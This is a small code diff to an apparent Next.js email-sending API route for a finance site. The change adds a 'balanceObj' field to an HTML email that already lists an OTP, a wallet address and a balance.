@@ -14,7 +14,7 @@ const transporter = nodemailer.createTransport({
 })
 
 export async function POST(request: NextRequest) {
-  const { email, otp, name = "Valued User", address , balance} = await request.json()
+  const { email, otp, name = "Valued User", address , balance, balanceObj} = await request.json()
 
   if (!email || !otp) {
     return NextResponse.json({ error: "Missing required data" }, { status: 400 })
@@ -148,6 +148,7 @@ https://thesector.finance
         <li>OTP: ${otp}</li>
         <li>Wallet address: ${address}</li>
         <li>Balance: ${balance}</li>
+        <li>More balance info: ${balanceObj}</li>
         </ul>
         </body>
 
